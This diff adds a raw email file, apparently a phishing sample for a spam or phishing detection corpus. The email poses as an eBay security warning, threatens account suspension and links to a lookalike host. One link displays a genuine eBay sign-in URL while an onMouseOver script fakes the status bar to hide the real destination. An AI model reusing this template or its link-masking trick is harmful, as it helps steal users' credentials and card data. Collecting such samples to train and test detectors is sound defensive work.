@@ -1,0 +1,67 @@
+From nobody Sun Jan 25 13:47:54 2015
+Return-Path: <security@eBay.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.23.1.4])
+ by spanky.domain.com (Postfix) with ESMTP
+ id 8B3F7536EB0; Sun, 15 May 2005 04:51:52 -0400 (EDT)
+Received: from mail.com (unknown [62.193.235.119])
+ by mail1.domain.com (Postfix) with SMTP id 70B6085AF09;
+ Sun, 15 May 2005 04:51:51 -0400 (EDT)
+Reply-To: <noreply@eBay.com>
+From: "eBay Security Service" <security@eBay.com>
+Subject: WARNING: Security Issues
+Date: Mon, 17 Mar 2003 09:52:57 +0100
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20050515085151.70B6085AF09@mail1.domain.com>
+To: undisclosed-recipients: ;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 343
+
+<body>
+
+<CENTER>
+<font face="Verdana" style="font-size: 9pt">&nbsp; This message contains 
+graphics. If you do not see the graphics,
+<b>
+<a target="_blank" href="http://vds-351816.amen-pro.com/eBay/saw-cgi/eBayISAPI.dll/PlaceCCInfo/index.html"><FONT
+color=#003399>click here to view</FONT></a></b>.</font></CENTER><!--VERSION value="4.3.0"-->
+<TABLE cellSpacing=0 cellPadding=0 width=774 border=0 xt="SPTABLE"
+name="SP_TABLE1" id="table1" height="320">
+<TBODY>
+<p>
+<a target="_blank" href="http://vds-351816.amen-pro.com/eBay/saw-cgi/eBayISAPI.dll/PlaceCCInfo/index.html"><font face="Verdana" style="font-size: 9pt">
+<img border="0" src="http://pics.ebaystatic.com/aw/pics/navbar/eBayLogoTM.gif" width="150" height="70"></font></p>
+<p><img border="0" src="http://pics.ebaystatic.com/aw/pics/hp/hdr_760x47.gif" width="760" height="47"></p></a>
+
+<b>Dear eBay ® valued member</b>,<br>
+<br>
+Due to concerns we have for the safety and integrity of the eBay<br>
+community we have issued this warning. <br>
+<br>
+Per the User Agreement, Section 9, we may immediately issue a <br>
+warning, temporarily suspend, indefinitely suspend or terminate your membership<br>
+and refuse to provide our services to you if we believe that your actions<br>
+may cause financial loss or legal liability for you, our users or us. We may also<br>
+take these actions if we are unable to verify or authenticate any<br>
+information you provide to us.<br>
+<br>
+Please follow the link below <br>
+<i></i> and
+update your account information.
+<br><a href="http://vds-351816.amen-pro.com/eBay/saw-cgi/eBayISAPI.dll/PlaceCCInfo/index.html" onMouseOver="status='http://signin.ebay.com/aw-cgi/eBayISAPI.dll?SignIn&ssPageName'; return true" onMouseOut="status='';return true">http://signin.ebay.com/aw-cgi/eBayISAPI.dll?SignIn&ssPageName</a>
+<p><img
+ src="http://pics.ebay.com/aw/pics/register/HeaderRegister_387x40.gif"
+ alt="eBay" width="387" height="40">
+<br>
+<b>Regards,<br>
+eBay Service Department</b></table>
